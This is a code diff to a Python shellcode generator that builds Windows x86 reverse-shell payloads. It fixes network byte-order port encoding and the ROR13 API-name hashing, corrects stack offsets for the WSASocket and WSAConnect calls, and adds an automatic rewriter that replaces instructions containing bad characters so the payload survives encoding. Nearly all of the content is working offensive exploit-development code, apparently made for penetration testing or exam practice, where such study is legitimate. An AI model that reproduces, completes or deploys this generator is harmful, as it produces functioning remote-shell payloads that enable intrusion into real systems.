@@ -462,17 +462,17 @@ class ShellcodeGenerator:
         return '0x' + ''.join(f'{p:02x}' for p in parts)
 
     def _port_to_hex(self, port: int) -> str:
-        """Convert port to hex format (big-endian for network byte order)"""
-        port_bytes = struct.pack('>H', port)
-        return '0x' + ''.join(f'{b:02x}' for b in port_bytes)
+        """Convert port to hex format (bytes swapped for assembly loading)"""
+        port_hex = format(port, '04x')
+        # Swap bytes: 0x1234 -> 0x3412 (needed because assembly does mov ax, value; shl eax, 0x10)
+        return '0x' + port_hex[2:4] + port_hex[0:2]
 
     def _hash_function_name(self, name: str) -> int:
         """Generate hash for function name (ROR13 algorithm)"""
         edx = 0
         for c in name:
-            edx = edx + ord(c)
-            if c != name[-1]:
-                edx = self._ror(edx, 13, 32)
+            edx = self._ror(edx, 13, 32)  # Rotate FIRST
+            edx = edx + ord(c)             # Then add
         return edx & 0xFFFFFFFF
 
     def _ror(self, val: int, count: int, bits: int) -> int:
@@ -601,7 +601,7 @@ class ShellcodeGenerator:
             mov [ebp+0x1c], eax
             push {hex(wsasocket_hash)}
             call [ebp+0x04]
-            mov [ebp+0x30], eax
+            mov [ebp+0x20], eax
             push {hex(wsaconnect_hash)}
             call [ebp+0x04]
             mov [ebp+0x24], eax
@@ -628,7 +628,7 @@ class ShellcodeGenerator:
             push eax
             inc eax
             push eax
-            call [ebp+0x30]
+            call [ebp+0x20]
 
         call_wsaconnect:
             mov esi, eax
@@ -666,6 +666,7 @@ class ShellcodeGenerator:
             add eax, ecx
             push eax
             xor eax, eax
+            push eax
             push eax
             push eax
             push eax
@@ -990,19 +991,53 @@ def apply_auto_fix(asm_code: str, results: List[Dict], bad_chars: Set[int], args
     print(f"{Colors.CYAN}[*] Building fix map from suggestions...{Colors.END}")
 
     for result in results:
-        if result['has_badchar'] and result['alternatives']:
-            # Get the first alternative
-            alt_code, explanation = result['alternatives'][0]
-
+        if result['has_badchar']:
             instruction_key = f"{result['mnemonic']} {result['op_str']}"
-            fix_map[instruction_key] = {
-                'original': instruction_key,
-                'replacement': alt_code,
-                'explanation': explanation
-            }
 
-            print(f"{Colors.YELLOW}  - Will replace: {Colors.END}{instruction_key}")
-            print(f"{Colors.GREEN}    With: {Colors.END}{alt_code.replace(chr(10), ' → ')}")
+            # Try to find a fix that doesn't have badchars
+            selected_fix = None
+
+            if result['alternatives']:
+                # First try the suggested alternatives
+                for alt_code, explanation in result['alternatives']:
+                    if not InstructionAlternatives._has_badchars(alt_code, bad_chars):
+                        selected_fix = (alt_code, explanation)
+                        break
+
+            # If no suggested alternative works, try advanced techniques for specific instructions
+            if not selected_fix:
+                mnemonic = result['mnemonic']
+                op_str = result['op_str']
+
+                # Special handling for PUSH immediate with badchars
+                if mnemonic == 'push' and op_str.startswith('0x'):
+                    try:
+                        value = int(op_str, 16)
+                        # Try advanced techniques with each register
+                        for reg in ['eax', 'ebx', 'ecx', 'edx']:
+                            # Try NOT/NEG/decomposition
+                            mov_alts = InstructionAlternatives.suggest_immediate_value_alternatives(reg, value, bad_chars)
+                            for mov_code, mov_expl in mov_alts:
+                                alt_code = f"{mov_code}\npush {reg}"
+                                if not InstructionAlternatives._has_badchars(alt_code, bad_chars):
+                                    selected_fix = (alt_code, f"Advanced fix: {mov_expl}, then PUSH {reg}")
+                                    break
+                            if selected_fix:
+                                break
+                    except:
+                        pass
+
+            if selected_fix:
+                alt_code, explanation = selected_fix
+                fix_map[instruction_key] = {
+                    'original': instruction_key,
+                    'replacement': alt_code,
+                    'explanation': explanation
+                }
+                print(f"{Colors.YELLOW}  - Will replace: {Colors.END}{instruction_key}")
+                print(f"{Colors.GREEN}    With: {Colors.END}{alt_code.replace(chr(10), ' → ')}")
+            else:
+                print(f"{Colors.RED}  - No fix found for: {Colors.END}{instruction_key}")
 
     if not fix_map:
         print(f"{Colors.YELLOW}[*] No automatic fixes available{Colors.END}")
